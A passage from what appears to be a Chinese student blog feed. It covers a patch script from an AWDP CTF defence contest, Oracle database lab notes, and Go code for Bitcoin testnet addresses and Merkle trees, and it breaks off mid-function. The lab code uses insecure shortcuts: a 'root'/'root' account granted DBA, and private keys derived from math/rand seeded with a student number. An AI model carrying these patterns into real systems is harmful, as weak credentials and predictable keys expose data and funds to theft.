<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pkill -u user</span><br><span class="line">cat app.py &gt; /home/user/app.py</span><br><span class="line">nohup python3 /home/user/app.py &gt; res.file 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
<p>这个仅仅是python的，碰到那个java题更是难受，需要自己传jar包上去，虽然都代码怎么改是对的，但就是修不动。</p>
<p>总而言之第一次awdp因为不太懂Update.sh的问题错失了一道或者两道题的修补机会，少上了好多分，要是之前打过的话有经验的话就应该能进前四了。</p>
<p>另外awdp不让上网是真的难受，打web不上网，全靠一个脑子积累，碰到新的知识点只能干瞪眼。。。以后电脑里还是要多备这种类似rogue mysql server的神仙脚本吧。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>oracle数据库实验整理</title>
    <url>/2021/10/14/oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%9E%E9%AA%8C%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<h1 id="oracle数据库实验整理"><a href="#oracle数据库实验整理" class="headerlink" title="oracle数据库实验整理"></a>oracle数据库实验整理</h1><p>一门0.5学分的选修课，学一学另一种著名的关系型数据库oracle的一些基本操作。</p>
<span id="more"></span>
<ul>
<li>TNS数据库监听端口1521</li>
<li>MTS端口2258 ‘Oracle Services for Microsoft Transaction Server’ 的端口</li>
<li>HTTP监听端口9090</li>
</ul>
<p>千万别用8080！会和burp冲突，当时打比赛的时候直接一键删除了oracle，结果重装的时候差点被吓死。</p>
<p><a href="https://blog.csdn.net/weixin_43620238/article/details/84497520">https://blog.csdn.net/weixin_43620238/article/details/84497520</a></p>
<p>用管理员身份在cmd里删除注册表后才叫彻底删除。</p>
<p>重装后参考了这篇博客<a href="https://blog.csdn.net/qq_40391559/article/details/88854961，把http端口改成了9090。">https://blog.csdn.net/qq_40391559/article/details/88854961，把http端口改成了9090。</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc delete OracleServiceXE</span><br></pre></td></tr></table></figure>
<h3 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create user root identified by root;</span><br><span class="line">设置权限</span><br><span class="line">grant dba to root;</span><br></pre></td></tr></table></figure>
<h3 id="无用户名登录"><a href="#无用户名登录" class="headerlink" title="无用户名登录"></a>无用户名登录</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlplus / as sysdba;</span><br><span class="line">sqlplus sys/nolog as sysdba;</span><br></pre></td></tr></table></figure>
<h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlplus username/pwd@ip:port/orcl as sysdba</span><br><span class="line">as sysdba是以系统管理员的身份来登录</span><br><span class="line">普通用户：</span><br><span class="line">sqlplus username/pwd</span><br></pre></td></tr></table></figure>
<p>dba：Database Administrator数据库管理员</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name,dbid from v$database;查看数据库名</span><br></pre></td></tr></table></figure>
<h3 id="developer图形化界面连接数据库："><a href="#developer图形化界面连接数据库：" class="headerlink" title="developer图形化界面连接数据库："></a>developer图形化界面连接数据库：</h3><p>将主机名修改为localhost即可。</p>
<p><img src="/2021/10/14/oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%9E%E9%AA%8C%E6%95%B4%E7%90%86/assets/image-20211014152202324.png" alt="image-20211014152202324"></p>
<p>oracle不会像mysql一样每一条都执行，需要在最后手动执行<code>commit;</code>指令进行提交。（叫提交修改）</p>
<h3 id="oracle表空间"><a href="#oracle表空间" class="headerlink" title="oracle表空间"></a>oracle表空间</h3><blockquote>
<p>从逻辑的角度来看，一个数据库（database）下面可以分多个表空间（tablespace）；一个表空间下面又可以分多个段（segment）；一个数据表要占一个段（segment），一个索引也要占一个段（segment ）。 一个段（segment）由多个 区间（extent）组成，那么一个区间又由一组连续的数据块（data block）组成。这连续的数据块是在逻辑上是连续的，有可能在物理磁盘上是分散。</p>
<p>那么从物理的角度上看，一个表空间由多个数据文件组成，数据文件是实实在在存在的磁盘上的文件。这些文件是由oracle数据库操作系统的block 组成的。</p>
<p><img src="/2021/10/14/oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%9E%E9%AA%8C%E6%95%B4%E7%90%86/assets/image-20211223214023277.png" alt="image-20211223214023277"></p>
</blockquote>
<h4 id="查看表空间："><a href="#查看表空间：" class="headerlink" title="查看表空间："></a>查看表空间：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from v$tablespace;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/10/14/oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%9E%E9%AA%8C%E6%95%B4%E7%90%86/assets/image-20211027160409438.png" alt="image-20211027160409438"></p>
<p><img src="/2021/10/14/oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%9E%E9%AA%8C%E6%95%B4%E7%90%86/assets/image-20211027160353930.png" alt="image-20211027160353930"></p>
<p>可以发现是能对应上的。</p>
<h4 id="查看每个表空间有哪些数据文件："><a href="#查看每个表空间有哪些数据文件：" class="headerlink" title="查看每个表空间有哪些数据文件："></a>查看每个表空间有哪些数据文件：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">desc dba_data_files;</span><br></pre></td></tr></table></figure>
<h4 id="查看详细数据文件："><a href="#查看详细数据文件：" class="headerlink" title="查看详细数据文件："></a>查看详细数据文件：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select file_name,tablespace_name from dba_data_files;</span><br></pre></td></tr></table></figure>
<h4 id="新建表空间"><a href="#新建表空间" class="headerlink" title="新建表空间"></a>新建表空间</h4><p><a href="https://blog.csdn.net/starnight_cbj/article/details/6792364">https://blog.csdn.net/starnight_cbj/article/details/6792364</a></p>
<h3 id="修改字符集"><a href="#修改字符集" class="headerlink" title="修改字符集"></a>修改字符集</h3><h4 id="查看当前字符集"><a href="#查看当前字符集" class="headerlink" title="查看当前字符集"></a>查看当前字符集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select userenv(&#x27;language&#x27;) from dual;</span><br></pre></td></tr></table></figure>
<p>实验要求要修改为ZHS16GBK，不知道为啥要往小了变。</p>
<h3 id="create表"><a href="#create表" class="headerlink" title="create表"></a>create表</h3><p>创建一个外键约束</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE child_table (</span><br><span class="line">    ...</span><br><span class="line">    CONSTRAINT fk_name</span><br><span class="line">    FOREIGN KEY(col1, col2,...) REFERENCES parent_table(col1,col2) </span><br><span class="line">    ON DELETE [ CASCADE | SET NULL ]</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>ON DELETE CASCADE:如果父表中的一行被删除，那么子表中引用被删除行的所有行都将被删除。</p>
<p>ON DELETE SET NULL:如果父表中的一行被删除，那么对于外键列，子表中引用被删除行的所有行将被设置为NULL。</p>
<p>一个表可以有多个外键约束</p>
<h3 id="drop表"><a href="#drop表" class="headerlink" title="drop表"></a>drop表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop table countries;</span><br></pre></td></tr></table></figure>
<h3 id="删表所有内容"><a href="#删表所有内容" class="headerlink" title="删表所有内容"></a>删表所有内容</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete from abc;</span><br></pre></td></tr></table></figure>
<h3 id="查询当前用户所有表："><a href="#查询当前用户所有表：" class="headerlink" title="查询当前用户所有表："></a>查询当前用户所有表：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from all_tables where owner=&#x27;OT&#x27;</span><br></pre></td></tr></table></figure>
<p>insert的时候前后加上</p>
<ol>
<li><p>REM INSERTING into database1.”Users”</p>
</li>
<li><p>SET DEFINE OFF;</p>
<p>的原因：默认情况下，<a href="https://www.jb51.cc/tag/sql/">sql</a> Plus处理’&amp;’作为开始替换字符串的特殊字符。这可能会导致运行脚本的问题，而这些脚本恰好包含’&amp;’由于其他原因：</p>
<p>如果您知道您的脚本包含(或可能包含)包含“&amp;”的数据字符，并且您不想像上述那样执行替换行为，然后在运行脚本时使用set define off<a href="https://www.jb51.cc/tag/guanbi/">关闭</a>该行为：</p>
</li>
</ol>
<h3 id="oracle-tips"><a href="#oracle-tips" class="headerlink" title="oracle tips"></a>oracle tips</h3><p>在Oracle里，表的别名不能用as,列的别名可以用as</p>
<h2 id="oracle与mysql，sql-server的区别"><a href="#oracle与mysql，sql-server的区别" class="headerlink" title="oracle与mysql，sql server的区别"></a>oracle与mysql，sql server的区别</h2><p>oracle多了一个实例的概念，他是物理内存里的数据结构，它由操作系统的<strong>多个后台进程和一个共享的内存池</strong>所组成。</p>
<p>如果我们想存取数据库上的数据，需要通过oracle实例。</p>
<h2 id="oracle安全部分"><a href="#oracle安全部分" class="headerlink" title="oracle安全部分"></a>oracle安全部分</h2><p>安全和最小权限原则</p>
]]></content>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链实验</title>
    <url>/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<p>本学期相对比较比较比较有意思的一门课，要把学习的过程记录下来。</p>
<span id="more"></span>
<h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><p>安装go环境，下载jb公司的Goland（半年前下载的），自带了一个<code>go 16.8 windows/amd64</code>版本，在linux下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install golang-go</span><br></pre></td></tr></table></figure>
<p>一键就能装好新版本，是<code>go version go1.13.8 linux/amd64</code>。</p>
<p>然后配置gopath,gopath的作用是存放sdk以外的第三方类库和自己复用的代码，一般GOPATH分为Global GOPATH和Project GOPATH，而gopath里包含三个文件：src(源代码),pkg(中间文件),bin(可执行文件)，具体的我还没搞明白，反正目前长这样：</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211019134251450.png" alt="image-20211019134251450"></p>
<p>然后在<code>Run/Debug Configurations</code>里选用<code>go build</code>就能编译代码了。</p>
<p>我的helloworld：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;hello world\n&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="GO初学踩坑"><a href="#GO初学踩坑" class="headerlink" title="GO初学踩坑"></a>GO初学踩坑</h2><h3 id="bx"><a href="#bx" class="headerlink" title="bx"></a>bx</h3><p>发现了一个好东西，叫做bitcoin-explorer，中文名是区块链-比特币浏览器，它是一个独立的、跨平台的比特币命令行工具，方便我debug用的，但是我在linux上没下到。</p>
<p>网址是<a href="https://blockexplorer.com/">https://blockexplorer.com/</a></p>
<p>Bitcoin Command Line Tool：命令行下载网址：<a href="https://github.com/libbitcoin/libbitcoin-explorer">https://github.com/libbitcoin/libbitcoin-explorer</a></p>
<p>防止翻车我去下到我的虚拟机里了，需要进行一波巨长的<code>install.sh</code>，最后一波有连续六个git clone，能不能克隆下来完全靠脸，我最高记录是到第五轮寄了，要改的话得去改800多行的.sh文件，但我懒得改了，就这样吧。</p>
<h3 id="文件位置"><a href="#文件位置" class="headerlink" title="文件位置"></a>文件位置</h3><p>设置好gopath后，为了调用<code>golang.org/x/crypto/ripemd160</code>这个函数，我把<code>golang.org</code>这个文件夹放在了<code>$GOPATH/src</code>下，但是仍然无法在我的项目下build，一直显示这个错误：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">no required module provides package golang.org/x/crypto/ripemd160; to add it</span><br><span class="line">    go get golang.org/x/crypto/ripemd160 </span><br></pre></td></tr></table></figure>
<p>当时就一脸懵逼，我不是库都装好了吗，为啥他找不到，最后的解决是我把项目文件放到<code>$GOPATH/src</code>下的同目录下了，终于能进行正常的import了。</p>
<h3 id="package问题"><a href="#package问题" class="headerlink" title="package问题"></a>package问题</h3><p>当你做这个实验，你要整个项目都以package形式build的话，你要修改你的package main，表示这是一个入口文件，然后才能go build.</p>
<p>等你实验做完了，要把当成一个package了，以后想用这个函数，再把package name改成原来那个就行。</p>
<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><h3 id="三个数lcm"><a href="#三个数lcm" class="headerlink" title="三个数lcm"></a>三个数lcm</h3><p>秒了</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">gcd</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> b == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> a</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> gcd(b, a%b)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lcm</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> a * b / gcd(a, b)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">three_lcm_test</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> a, b, c <span class="keyword">int</span></span><br><span class="line">	fmt.Scan(&amp;a, &amp;b, &amp;c)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%d&quot;</span>, lcm(lcm(a, b), c))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="生成比特币交易地址"><a href="#生成比特币交易地址" class="headerlink" title="生成比特币交易地址"></a>生成比特币交易地址</h3><p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211022133136523.png" alt="image-20211022133136523"></p>
<p>收集到的比特币公私钥和地址各种格式前缀</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>种类</th>
<th>版本前缀 (hex)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Bitcoin Address</td>
<td>0x00</td>
</tr>
<tr>
<td>Pay-to-Script-Hash Address</td>
<td>0x05</td>
</tr>
<tr>
<td>Bitcoin Testnet Address</td>
<td>0x6F</td>
</tr>
<tr>
<td>Private Key WIF</td>
<td>0x80</td>
</tr>
<tr>
<td>BIP38 Encrypted Private Key</td>
<td>0x0142</td>
</tr>
<tr>
<td>BIP32 Extended Public Key</td>
<td>0x0488B21E</td>
</tr>
</tbody>
</table>
</div>
<p>在本次实验中我们选用的Bitcoin Testnet Address，故版本前缀为<code>0x6F</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;base58&quot;</span></span><br><span class="line">	<span class="string">&quot;crypto/sha256&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;golang.org/x/crypto/ripemd160&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> VersionByte = []<span class="keyword">byte</span>(<span class="string">&quot;\x6f&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Sha256</span><span class="params">(src []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	m := sha256.New()</span><br><span class="line">	m.Write(src)</span><br><span class="line">	<span class="keyword">return</span> m.Sum(<span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Ripemd160</span><span class="params">(src []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	m := ripemd160.New()</span><br><span class="line">	m.Write(src)</span><br><span class="line">	<span class="keyword">return</span> m.Sum(<span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Hash160</span><span class="params">(src []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> Ripemd160(Sha256(src))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Hash256</span><span class="params">(src []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> Sha256(Sha256(src))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Base58</span><span class="params">(src []<span class="keyword">byte</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	myAlphabet := base58.BitcoinAlphabet</span><br><span class="line">	encodedString := base58.Encode(src, myAlphabet)</span><br><span class="line">	<span class="keyword">return</span> encodedString</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getAddress</span><span class="params">(src []<span class="keyword">byte</span>)</span> <span class="title">string</span></span>&#123;</span><br><span class="line">	fingerprint := Hash160(src)</span><br><span class="line">	Checksum := Hash256((<span class="built_in">append</span>(VersionByte, fingerprint...)))[:<span class="number">4</span>]</span><br><span class="line">	<span class="keyword">var</span> base = <span class="built_in">append</span>(<span class="built_in">append</span>(VersionByte, fingerprint...), Checksum...)</span><br><span class="line">	<span class="keyword">return</span> Base58(base)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestURL</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> data <span class="keyword">string</span></span><br><span class="line">	fmt.Scanf(<span class="string">&quot;%s&quot;</span>, &amp;data)</span><br><span class="line">	pubkey, _ := hex.DecodeString(data)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, getAddress(pubkey))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在代码实现的时候纠结了一会[]byte和string的事情，还有上来不知道hex.DecodeString，还自己手动对读进来的字符串进行两两分组然后sscanf..</p>
<h3 id="Merkle-Tree"><a href="#Merkle-Tree" class="headerlink" title="Merkle Tree"></a>Merkle Tree</h3><p>可以简单理解为一棵二叉树的哈希，只有叶节点存交易数据块，如果订单发生改变，那么这条链的哈希值都会发生改变，所以在分析哪里发生交易了，就可以从根节点往下dfs，一直往哈希值改变的儿子走，走$log$次就能走到发生改变的节点。</p>
<p>于是实现的时候采用了动态开节点，为了方便定位叶子节点的位置，所以在传参的时候传了个当前编号，编号规则类似与线段树，在比较两棵树的时候就往下递归查询即可,compareMerkleTree函数会返回发生数据变化的节点块。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> MerkleNode <span class="keyword">struct</span> &#123;</span><br><span class="line">	lson *MerkleNode</span><br><span class="line">	rson *MerkleNode</span><br><span class="line">	Data []<span class="keyword">byte</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">createNode</span><span class="params">(left, right *MerkleNode, data []<span class="keyword">byte</span>)</span> *<span class="title">MerkleNode</span></span> &#123;</span><br><span class="line">	now := MerkleNode&#123;&#125;</span><br><span class="line">	<span class="keyword">if</span> left == <span class="literal">nil</span> &amp;&amp; right == <span class="literal">nil</span> &#123;</span><br><span class="line">		now.Data = Sha256(data)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		mix := <span class="built_in">append</span>(left.Data, right.Data...)</span><br><span class="line">		now.Data = Sha256(mix)</span><br><span class="line">	&#125;</span><br><span class="line">	now.lson = left</span><br><span class="line">	now.rson = right</span><br><span class="line">	<span class="keyword">return</span> &amp;now</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">build</span><span class="params">(depth, id, total <span class="keyword">int</span>, params [][]<span class="keyword">byte</span>)</span> *<span class="title">MerkleNode</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> depth == total &#123;</span><br><span class="line">		here := createNode(<span class="literal">nil</span>, <span class="literal">nil</span>, params[id-(<span class="number">1</span>&lt;&lt;depth)])</span><br><span class="line">		<span class="keyword">return</span> here</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		lson := build(depth+<span class="number">1</span>, id&lt;&lt;<span class="number">1</span>, total, params)</span><br><span class="line">		rson := build(depth+<span class="number">1</span>, id&lt;&lt;<span class="number">1</span>|<span class="number">1</span>, total, params)</span><br><span class="line">		here := createNode(lson, rson, <span class="literal">nil</span>)</span><br><span class="line">		<span class="keyword">return</span> here</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">compareMerkleTree</span><span class="params">(tree1, tree2 *MerkleNode, depth, id, total <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> depth == total &#123;</span><br><span class="line">		<span class="keyword">if</span> hex.EncodeToString(tree1.Data) != hex.EncodeToString(tree2.Data) &#123;</span><br><span class="line">			<span class="keyword">return</span> id - (<span class="number">1</span> &lt;&lt; depth)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> tree1.lson != <span class="literal">nil</span> &amp;&amp; tree2.lson != <span class="literal">nil</span> &#123;</span><br><span class="line">		res := compareMerkleTree(tree1.lson, tree2.lson, depth+<span class="number">1</span>, id&lt;&lt;<span class="number">1</span>, total)</span><br><span class="line">		<span class="keyword">if</span> res != <span class="number">-1</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> res</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> tree1.rson != <span class="literal">nil</span> &amp;&amp; tree2.rson != <span class="literal">nil</span> &#123;</span><br><span class="line">		res := compareMerkleTree(tree1.rson, tree2.rson, depth+<span class="number">1</span>, id&lt;&lt;<span class="number">1</span>|<span class="number">1</span>, total)</span><br><span class="line">		<span class="keyword">if</span> res != <span class="number">-1</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> res</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> weight_A = [][]<span class="keyword">byte</span>&#123;[]<span class="keyword">byte</span>(<span class="string">&quot;\x00&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x01&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x02&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x03&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x04&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x05&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x06&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x07&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x08&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x09&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0a&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0b&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0c&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0d&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0e&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0f&quot;</span>)&#125;</span><br><span class="line"><span class="keyword">var</span> weight_B = [][]<span class="keyword">byte</span>&#123;[]<span class="keyword">byte</span>(<span class="string">&quot;\x00&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x01&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x03&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x03&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x04&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x05&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x06&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x07&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x08&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x09&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0a&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0b&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0c&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0d&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0e&quot;</span>), []<span class="keyword">byte</span>(<span class="string">&quot;\x0f&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MerkleTree_test</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> Aroot = build(<span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, weight_A)</span><br><span class="line">	<span class="keyword">var</span> Broot = build(<span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, weight_B)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, hex.EncodeToString(Aroot.Data))</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, hex.EncodeToString(Broot.Data))</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%d\n&quot;</span>, compareMerkleTree(Aroot, Broot, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="拓展实验"><a href="#拓展实验" class="headerlink" title="拓展实验"></a>拓展实验</h3><p>挖矿，用自己的学号当种子算私钥，然后再算公钥，再用第二份算地址的代码算base58，如果里面包含ccc的子串，那就提交到网址，获取小额测试用比特币。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;crypto/ecdsa&quot;</span></span><br><span class="line">	<span class="string">&quot;crypto/elliptic&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">var</span> src = rand.New(rand.NewSource(xxxx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RandStringBytesMaskImprSrc</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	b := <span class="built_in">make</span>([]<span class="keyword">byte</span>, (n+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">	<span class="keyword">if</span> _, err := src.Read(b); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> hex.EncodeToString(b)[:n]</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newKeyPair</span><span class="params">()</span> <span class="params">(ecdsa.PrivateKey,[]<span class="keyword">byte</span>)</span></span>&#123;</span><br><span class="line">	curve :=elliptic.P256()</span><br><span class="line">	private,err :=ecdsa.GenerateKey(curve,strings.NewReader(RandStringBytesMaskImprSrc(<span class="number">50</span>)))</span><br><span class="line">	<span class="keyword">if</span> err !=<span class="literal">nil</span>&#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;error&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pubkey :=<span class="built_in">append</span>(private.PublicKey.X.Bytes(),private.PublicKey.Y.Bytes()...)</span><br><span class="line">	<span class="keyword">return</span> *private,pubkey</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Checkccc</span><span class="params">(src <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	length := <span class="built_in">len</span>(src)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; length - <span class="number">2</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">if</span> src[i] == <span class="string">&#x27;c&#x27;</span> &amp;&amp; src[i + <span class="number">1</span>] ==<span class="string">&#x27;c&#x27;</span> &amp;&amp; src[i + <span class="number">2</span>] ==<span class="string">&#x27;c&#x27;</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">		&#125;</span><br><span class="line">	